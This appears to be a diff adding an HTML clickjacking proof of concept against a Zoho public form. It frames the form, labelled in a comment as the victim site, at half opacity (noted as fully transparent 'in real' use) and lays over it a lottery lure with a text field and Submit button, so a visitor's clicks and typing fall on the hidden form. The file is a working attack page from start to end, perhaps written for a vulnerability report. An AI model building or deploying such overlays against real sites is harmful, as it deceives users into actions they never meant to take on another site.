@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<style>
+
+iframe { /* iframe from the victim site */
+  width: 900px;
+  height: 820px;
+  position: absolute;
+  top:0; left:-20px;
+  opacity: 0.5; /* in real opacity:0 */
+  z-index: 1;
+} 
+
+h3
+{
+position: absolute;
+top: 80px;
+left: 530px;
+font-family: monospace;
+font-size: 20px;
+}
+
+.btn1 {
+  background-color: #b29bda;
+  color: white;
+  border-top-left-radius:20px;
+  border-top-right-radius:20px;
+  border-bottom-right-radius:20px;
+  border-bottom-left-radius:20px;
+  width: 300px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 15px;
+  right: 200px;
+}
+
+
+
+.img1
+{
+  height: 200px;
+}
+
+
+
+}
+</style>
+</head>
+<body>
+
+  <iframe style="height:1000px;width:100%;border:none;" src='https://forms.zohopublic.com/test743/form/TestEmbedForm/formperma/ujEwkFkEorEf4c1NvQOz6Cnq-aZ0iw8AfDPju_Kit6Q'></iframe>
+
+
+<div></div>
+
+
+<h3>
+  Enter your Name to Win the LOTTERY:
+  <br><br>
+  <input type="text" name="">
+
+
+<br>
+<img class="img1" src="https://www.covaipost.com/wp-content/uploads/2021/06/lottery-dictionary-content-image-1_1587647450673.jpg">
+<br>
+<button class="btn1"><p>Submit</p></button>
+ </h3>
+
+ 
+
+</body>
+</html>
+
